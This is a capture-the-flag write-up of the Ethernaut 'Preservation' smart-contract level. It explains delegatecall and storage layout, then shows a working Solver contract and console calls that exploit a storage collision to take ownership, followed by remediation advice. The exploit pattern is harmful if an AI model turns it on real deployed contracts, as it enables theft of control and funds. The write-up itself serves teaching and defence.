![Preservation](/assets/img/BigLevel16.svg)

- [Challenge](#challenge)
- [Recap](#recap)
  - [delegatecall()](#delegatecall)
  - [Storage](#storage)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level reads:

> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
> 
> The goal of this level is for you to claim ownership of the instance you are given.
> 
> Things that might help
> 
> - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
> - Understanding what it means for delegatecall to be context-preserving.
> - Understanding how storage variables are stored and accessed.
> - Understanding how casting works between different data types.

And gives us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

# Recap

First let's do a recap from [Delegation](/2023-07-07-ethernaut-06-delegation-writeup.md/) and [Privacy](/2023-07-17-ethernaut-12-privacy-writeup.md/) challenges, on how `delegatecall` and the `storage` work.

## delegatecall()

> There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values. This allows a smart contract to dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract.
>
> Calling into untrusted contracts is very dangerous, as the code at the target address can change any storage values of the caller and has full control over the caller's balance.

> If storage variables are accessed via a low-level delegatecall, the storage layout of the two contracts must align in order for the called contract to correctly access the storage variables of the calling contract by name. This is of course not the case if storage pointers are passed as function arguments as in the case for the high-level libraries.

## Storage

> Solidity storage is like an array of length 2^256. Each slot in the array can store 32 bytes.
>
> Order of declaration and the type of state variables define which slots it will use.

> Statically-sized variables (everything except mapping and dynamically-sized array types) are laid out contiguously in storage starting from position 0. Multiple items that need less than 32 bytes are packed into a single storage slot if possible, according to the following rules:
> 
> - The first item in a storage slot is stored lower-order aligned.
> - Elementary types use only that many bytes that are necessary to store them.
> - If an elementary type does not fit the remaining part of a storage slot, it is moved to the next storage slot.
> - Structs and array data always start a new slot and occupy whole slots (but items inside a struct or array are packed tightly according to these rules).

# Solution

With this information, let's start by exploring the storage of the level's contract:

```javascript
await web3.eth.getStorageAt(contract.address, 0)
'0x000000000000000000000000f88ed7d1dfcd1bb89a975662fd7cb536058f3a30'

await contract.timeZone1Library()
'0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30'

await web3.eth.getStorageAt(contract.address, 1)
'0x0000000000000000000000007f08c632697adf1b5052d2eb82d3a272b0b92312'

await contract.timeZone2Library()
'0x7F08c632697Adf1b5052d2Eb82D3A272B0B92312'

await web3.eth.getStorageAt(contract.address, 2)
'0x0000000000000000000000007ae0655f0ee1e7752d7c62493cea1e69a810e2ed'

await contract.owner()
'0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed'

await web3.eth.getStorageAt(contract.address, 3)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```

Now, what happens if we call `setFirstTime`?

```javascript
await contract.setFirstTime(1)


await web3.eth.getStorageAt(contract.address, 0)
'0x0000000000000000000000000000000000000000000000000000000000000001'

await contract.timeZone1Library()
'0x0000000000000000000000000000000000000001'

await contract.setFirstTime(9)


await contract.timeZone1Library()
'0x0000000000000000000000000000000000000001'
```

What does this mean? Well, when we first called `setFirstTime(1)` the contract delegated the execution into the address stored in `timeZone1Library`, which was an instance of the `LibraryContract`. This contract only have one variable, a `uint`. That's why it modified the first (and only the first) variable of the `Preservation` contract. And why haven't it set to `9` the second time we called it? Well, now `timeZone1Library` has `0x0000000000000000000000000000000000000001` stored in it. Which is NOT the address of the `LibraryContract`... Then nothing happened.

Let's call `setSecondTime` now and see what happens, should it modify `timeZone2Library` variable?

```javascript
await contract.setSecondTime(9)


await web3.eth.getStorageAt(contract.address, 1) // timeZone2Library variable
'0x0000000000000000000000007f08c632697adf1b5052d2eb82d3a272b0b92312'

await web3.eth.getStorageAt(contract.address, 0) // timeZone1Library variable
'0x0000000000000000000000000000000000000000000000000000000000000009'
```

It haven't modified the `timeZone2Library` but `timeZone1Library` instead... And this makes total sense, as the contract running on the address stored in `timeZone2Library` is the `LibraryContract` which modifies only one variable, and is the first one in the storage.

So, how could we manage to modify the owner variable?

Well, would it be possible for us to deploy a contract that has the same storage as the `Preservartion` contract? But that has the same signature of the `LibraryConctract` (for delegatecall to work)? And that it modifies the owner variable instead of `storedTime`?

Let's try it!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solver {
  // copied storage from Preservation
  address public timeZone1Library;
  address public timeZone2Library;
  uint public owner; // modified type of owner so we can save the uint that we send (that's going to be the address anyway)
  uint storedTime; 

  function setTime(uint _time) public {
    // same signature as the LibraryContract
    owner = _time;
  }
}
```

With that contract deployed, let's solve the challenge then:

```javascript
await contract.setSecondTime(SOLVER_ADDRESS) // to store the address of our Solver contract in the timeZone1Library variable

await contract.setFirstTime(player) // to execute our Solver contract setTime function with our address as input
```

Now if we call `await contract.timeZone1Library()` we will get the address of our `Solver` contract. And if we execute `await contract.owner()` we will get our own address!!! We solved the level!! :))))

![Well done](/assets/img/ethernaut_solved.png)

# Remediation

- Use `delegatecall` with caution and make sure to never call into untrusted contracts. If the target address is derived from user input ensure to check it against a whitelist of trusted contracts.
- For libraries, use the `library` keyword, which doesn't allow to declare any state variable nor to send ether.

# References

- [SWC-112](https://swcregistry.io/docs/SWC-112)
- [Units and Globally Available Variables](https://docs.soliditylang.org/en/v0.4.24/units-and-global-variables.html?highlight=delegatecall)
- [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)
- [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.4.24/miscellaneous.html#layout-of-state-variables-in-storage)